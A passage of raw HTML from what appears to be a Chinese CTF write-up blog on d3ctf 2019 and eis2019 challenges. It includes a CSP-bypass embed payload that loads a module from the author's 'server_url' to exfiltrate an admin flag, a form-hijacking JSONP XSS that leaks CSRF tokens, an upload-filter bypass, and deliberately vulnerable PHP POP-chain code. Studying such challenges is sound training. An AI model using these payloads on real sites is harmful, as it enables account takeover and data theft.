class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">&quot;img-src &#x27;none&#x27;; script-src &#x27;none&#x27;; frame-src &#x27;none&#x27;; connect-src &#x27;none&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;x-forwarded-for&#x27;</span>) != config[<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;host&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;only admin can see it&#x27;</span></span><br><span class="line">    token = request.host.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;&#x27;&#x27;&#123;&#123;</span></span><br><span class="line"><span class="string">    &quot;token&quot;: &quot;<span class="subst">&#123;token&#125;</span>&quot;,</span></span><br><span class="line"><span class="string">    &quot;flag&quot;: &quot;d3ctf&#123;&#123;<span class="subst">&#123;hashlib.sha256((</span></span></span><br><span class="line"><span class="subst"><span class="string">        token+config[<span class="string">&quot;challenge&quot;</span>][<span class="string">&quot;flag&quot;</span>]</span></span></span><br><span class="line"><span class="subst"><span class="string">    ).encode()).hexdigest()&#125;</span>&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<p>关键代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;captcha&#x27;</span> <span class="keyword">in</span> request.form.keys() <span class="keyword">and</span> <span class="string">&#x27;url&#x27;</span> <span class="keyword">in</span> request.form.keys():</span><br><span class="line">                captcha = request.form[<span class="string">&#x27;captcha&#x27;</span>]</span><br><span class="line">                url = request.form[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> verify_captcha(captcha):</span><br><span class="line">                    message = <span class="string">&quot;Wrong Captcha :(&quot;</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="keyword">not</span> verify_url(url):</span><br><span class="line">                    message = <span class="string">&quot;Wrong URL :(&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    session.pop(<span class="string">&#x27;captcha&#x27;</span>)</span><br><span class="line">                    message = <span class="string">&quot;Done! Please wait for the admin to check it out. XD&quot;</span></span><br><span class="line">                    add_queue(url)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            message = <span class="string">&quot;Error! Please contact admin&quot;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    base = <span class="string">&#x27;https://&#x27;</span>+request.host</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(url) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(url) &lt; <span class="built_in">len</span>(base) <span class="keyword">or</span> url[:<span class="built_in">len</span>(base)] != base:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过verify_url之后,admin便回访问.这里用<code>&#39;https://&#39;+request.host</code>来验证是否来源于原网站</p>
<p>emmm,request.host=<code>/fd.php</code>,就不用考虑修改host来绕过拉</p>
<p>那么就是要绕<code>/fd.php</code>的csp策略了:<code>img-src &#39;none&#39;; script-src &#39;none&#39;; frame-src &#39;none&#39;; connect-src &#39;none&#39;</code></p>
<p>真的是baby难度啊。。。。。</p>
<blockquote>
<p>丢到csp-evaluator里头可以发现没有设置object-src<br>object-src允许嵌入object<br>根据hint去<code>chrome://components</code>里头找有什么可以利用的组件<br>最新版chrome已经默认禁止了flash的使用(然而就是有很多人不信邪)<br>通过一些搜索可以发现pNaCl可以跑C/C++</p>
<p>可以编写一个Leak去请求admin.php，获取flag，然后再将flag带出来<br>下载下来谷歌的<a target="_blank" rel="noopener" href="https://developers.google.com/native-client/dev/sdk/download">SDK</a>和Leak后可以编译出一个nmf文件和一个pexe文件，放到自己的服务器上然后尝试:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://server_url/url_loader.nmf&quot;</span> <span class="attr">type</span>=<span class="string">&quot;application/x-pnacl&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>轻松获得了一个Mixed Content呢（（毒瘤出题人<br>上https以后发现:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;PNaCl modules can only be used on the open web (non-app/extension) when the PNaCl Origin Trial is enabled</span><br></pre></td></tr></table></figure>

<p>搜索Origin Trial，看新闻：</p>
<p><a target="_blank" rel="noopener" href="https://developer.chrome.com/native-client/migration">https://developer.chrome.com/native-client/migration</a><br><a target="_blank" rel="noopener" href="https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md">https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md</a></p>
<p>去<a target="_blank" rel="noopener" href="https://developers.chrome.com/origintrials">Origin Trial</a>申请一个token，最终的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;meta http-equiv=&quot;origin-trial&quot; content=&quot;[token]&quot;&gt;</span><br><span class="line">&gt;&lt;embed src=&quot;https://server_url/url_loader.nmf&quot; type=&quot;application/x-pnacl&quot;&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h3><p>自己搭的环境毛病一大堆///就直接看别人wp了</p>
<p>题目是一个在线留言板，注册登录后可以提交留言。</p>
<p>简单测试后会发现留言可以插入 HTML 标签，但是后端使用了标签名/属性名白名单做过滤，一般的危险标签和属性都被 ban 掉了。</p>
<p>控制台可以看到打包前的前端源码，审计一波。</p>
<p>第一个问题，CSRF token 是直接使用的 sessionid :</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/78572404b4f302815535605f49e47477df47f136/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f674f73476c66557a5a41767848434d2e706e67"><img src="https://camo.githubusercontent.com/78572404b4f302815535605f49e47477df47f136/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f674f73476c66557a5a41767848434d2e706e67" alt="img"></a></p>
<p>因此如果我们能获得他人的 token 就可以登录他人账号。</p>
<p>第二个问题，我们传入的参数 this.$route.query.did 被拼接到了 jsonp 方法的 url 当中</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/37614f78f54c402a09ef0efb3bdc891ee76697be/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f54627a6e38726741743453354568322e706e67"><img src="https://camo.githubusercontent.com/37614f78f54c402a09ef0efb3bdc891ee76697be/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f54627a6e38726741743453354568322e706e67" alt="img"></a></p>
<p>因此我们可以设置 did 为 <code>1/delete?callback=alert#</code> ，控制 jsonp 的 callback ，在 jsonp 方法中会直接执行：</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/b44851e6b9409b003729254870ebe56c33a0023d/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f32346958784f774b4d4979685551362e706e67"><img src="https://camo.githubusercontent.com/b44851e6b9409b003729254870ebe56c33a0023d/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f32346958784f774b4d4979685551362e706e67" alt="img"></a></p>
<p>但是后端的 jsonp api 给 callback 做了校验，只能传入有限的字符，并不能任意执行 js 代码。</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/c9d4940ee30bed9d3d348a23c5ef124647fce4e8/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f74514e6a44703138434b6e32376b642e706e67"><img src="https://camo.githubusercontent.com/c9d4940ee30bed9d3d348a23c5ef124647fce4e8/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f74514e6a44703138434b6e32376b642e706e67" alt="img"></a></p>
<p>所以我们需要把这两个问题结合利用一下，利用这个受限的 jsonp xss 来劫持 token 。</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/fb13e5fdc26601fe743c654637ce47d4654b8de9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f795a5769367348503252397a3344312e706e67"><img src="https://camo.githubusercontent.com/fb13e5fdc26601fe743c654637ce47d4654b8de9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f795a5769367348503252397a3344312e706e67" alt="img"></a></p>
<p>我们可以看到 token 被渲染到了 id 为 messageForm 的 form 中，所以我们可以尝试劫持这个 form ，让他的 submit 后提交到我们的服务器，从而获取 token 。</p>
<p>如何劫持呢？利用两个 HTML5 的有趣属性：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/att_input_formaction.asp">https://www.w3school.com.cn/tags/att_input_formaction.asp</a></p>
<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/att_input_form.asp">https://www.w3school.com.cn/tags/att_input_form.asp</a></p>
</blockquote>
<p>我们可以利用留言功能插入一个在表单之外的 input 标签，再利用这两个属性来劫持表单：</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/7c7d13633a5d667951eb89bc40a16176ca12ddb7/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f35544b66655745706958554c4d79612e706e67"><img src="https://camo.githubusercontent.com/7c7d13633a5d667951eb89bc40a16176ca12ddb7/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f35544b66655745706958554c4d79612e706e67" alt="img"></a></p>
<p>利用 jsonp xss 来点击它：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8180/#/?pid=72&amp;did=23%2Fdelete%3Fcallback%3Dfish.click%23</span><br></pre></td></tr></table></figure>

<p>token 就到手了：</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/ff79d0d683a4390d754c37675bc300da483a31e9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f576f7544666b724277684c415837502e706e67"><img src="https://camo.githubusercontent.com/ff79d0d683a4390d754c37675bc300da483a31e9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f576f7544666b724277684c415837502e706e67" alt="img"></a></p>
<p>report 这条 payload ，获得 admin 的 token 之后登录 admin 账号，在 admin 的留言中获得 flag 。</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="c-c"><a href="#c-c" class="headerlink" title="c+c"></a>c+c</h3><p>readme.txt</p>
<blockquote>
<p>This is a lite (which means there is no voice but the script is complete.) version of a great galgame (a.k.a. Visual Novel) written by Romeo Tanaka. Hope you enjoy it.<br>PS: I did some small hack to the game for cracking. But you still need steam running to play this game.<br>PSS: If you like it, you can buy it on steam.<br>PSSS: Do not forget to find the flag. And the flag is just in THIS file.</p>
</blockquote>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g976rzdu69j30j001aglt.jpg" alt="image.png"></p>
<p>游戏中会出现</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g976tjarq4j308k01nt8n.jpg" alt="image.png"></p>
<p>一些不可见字符8个以上,可能是flag?</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L0_0</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">local</span> L0_32, L1_33, L2_34, L3_35</span><br><span class="line">  L0_32 = &#123;</span><br><span class="line">    L1_33,</span><br><span class="line">    L2_34,</span><br><span class="line">    L3_35,</span><br><span class="line">    <span class="number">172</span>,</span><br><span class="line">    <span class="number">21</span>,</span><br><span class="line">    <span class="number">149</span>,</span><br><span class="line">    <span class="number">198</span>,</span><br><span class="line">    <span class="number">139</span>,</span><br><span class="line">    <span class="number">38</span>,</span><br><span class="line">    <span class="number">63</span>,</span><br><span class="line">    <span class="number">174</span>,</span><br><span class="line">    <span class="number">238</span>,</span><br><span class="line">    <span class="number">232</span>,</span><br><span class="line">    <span class="number">20</span>,</span><br><span class="line">    <span class="number">85</span>,</span><br><span class="line">    <span class="number">107</span></span><br><span class="line">  &#125;</span><br><span class="line">  L1_33 = <span class="number">221</span></span><br><span class="line">  L2_34 = <span class="number">179</span></span><br><span class="line">  L3_35 = <span class="number">102</span></span><br><span class="line">  L1_33 = <span class="number">166</span></span><br><span class="line">  L2_34 = <span class="number">44</span></span><br><span class="line">  L3_35 = <span class="string">&quot;&#123;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> _FORV_7_ = <span class="number">1</span>, #L0_32 <span class="keyword">do</span></span><br><span class="line">    L3_35 = L3_35 .. <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%02x&quot;</span>, L0_32[_FORV_7_] ~ L1_33)</span><br><span class="line">    <span class="keyword">if</span> _FORV_7_ == <span class="number">4</span> <span class="keyword">or</span> _FORV_7_ == <span class="number">6</span> <span class="keyword">or</span> _FORV_7_ == <span class="number">8</span> <span class="keyword">or</span> _FORV_7_ == <span class="number">10</span> <span class="keyword">then</span></span><br><span class="line">      L3_35 = L3_35 .. <span class="string">&quot;-&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L3_35 = L3_35 .. <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="built_in">string</span>.<span class="built_in">upper</span>(L3_35), L2_34</span><br><span class="line">    </span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>su直接去买了原版游戏，对比发现只有dll，exe文件不同</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g97whcjur2j31ya0poq7p.jpg" alt="image.png"></p>
<p>阵亡</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/04/19/d3ctf2019/" data-id="ckw63s4lm0043flolfhj7042u" data-title="d3ctf" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-eis2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/19/eis2019/" class="article-date">
  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/19/eis2019/">eis2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="eis2019"><a href="#eis2019" class="headerlink" title="eis2019"></a>eis2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>upload:</p>
<p>校验文件头</p>
<p>过滤后缀php</p>
<p>上传php5后缀绕过</p>
<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>, <span class="variable">$key</span> = <span class="string">&#x27;flysystem&#x27;</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key    = <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store  = <span class="variable">$store</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cachedProperties</span> = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$object</span>)) &#123;</span><br><span class="line">                <span class="variable">$contents</span>[<span class="variable">$path</span>] = array_intersect_key(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cleaned</span> = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([<span class="variable">$cleaned</span>, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params"><span class="variable">$expire</span></span>): <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$serialize</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expire</span>   = <span class="keyword">$this</span>-&gt;getExpireTime(<span class="variable">$expire</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir</span> = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;serialize(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 